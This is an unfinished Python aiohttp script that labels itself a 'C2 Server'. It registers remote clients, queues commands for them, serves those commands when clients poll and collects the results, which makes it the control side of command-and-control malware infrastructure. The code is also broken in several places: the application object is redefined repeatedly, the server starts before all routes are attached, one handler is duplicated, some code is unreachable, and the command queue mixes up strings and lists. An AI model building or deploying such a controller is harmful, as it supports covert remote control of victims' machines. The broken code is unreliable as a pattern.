import aiohttp
import asyncio
from aiohttp import web
import json
import time

# In-memory storage for connected clients and commands
clients = {}
commands = {}

async def register_client(request): #client is registered and now is recognized by the server
    """Registers a new client."""
    data = await request.json()
    client_id = data.get("client_id")
    
    if not client_id:
        return web.json_response({"error": "Missing client_id"}, status=400)

    clients[client_id] = {"status": "connected"}
    print(f"Registered client: {client_id}")  # Debugging line
    clients[client_id] = {"last_seen": time.time()}  # Update last seen time
    return web.json_response({"message": "Client registered", "client_id": client_id})

async def get_command(request): #client is "authenticated" and sends commands to server (not working yet)
    """Sends a command to a client."""
    client_id = request.match_info.get("client_id")
    
    if client_id not in clients: #if connection attempt comes from client that is not registered
        return web.json_response({"error": "Client not found"}, status=404)

    if client_id not in commands:
        return web.json_response({"error": "Client not found"}, status=404)  # <-- This is your error
    
    if commands[client_id]:
        return web.json_response({"command": commands[client_id].pop(0)})
    
    return web.json_response({"command": None})  # No command yet

    command = commands.pop(client_id, None)  # Retrieve and remove the command
    return web.json_response({"command": command if command else "ping"})

async def post_result(request):
    """Receives results from clients."""
    data = await request.json()
    client_id = data.get("client_id")
    result = data.get("result")

    if not client_id or not result:
        return web.json_response({"error": "Missing data"}, status=400)

    print(f"Received result from {client_id}: {result}")
    return web.json_response({"message": "Result received"})

async def issue_command(request):
    """Issues a command to a specific client."""
    data = await request.json()
    client_id = data.get("client_id")
    command = data.get("command")

    if not client_id or not command:
        return web.json_response({"error": "Missing data"}, status=400)

    commands[client_id] = command
    return web.json_response({"message": f"Command '{command}' sent to {client_id}"})

async def index(request):
    return web.Response(text="C2 Server Running", content_type="json") #text/html

async def index(request):
    return web.FileResponse("c2_webInterface.html")

app = web.Application()
app.router.add_get("/", index)


app = web.Application()
app.router.add_post("/register", register_client)  
app.router.add_get("/command/{client_id}", get_command)  
app.router.add_get("/", index)  # Add this route

web.run_app(app, host="localhost", port=8080)

app = web.Application()
app.add_routes([
    web.post("/register", register_client),
    web.get("/command/{client_id}", get_command),
    web.post("/result", post_result),
    web.post("/issue_command", issue_command)
])

if __name__ == "__main__":
    web.run_app(app, host="localhost", port=8080)
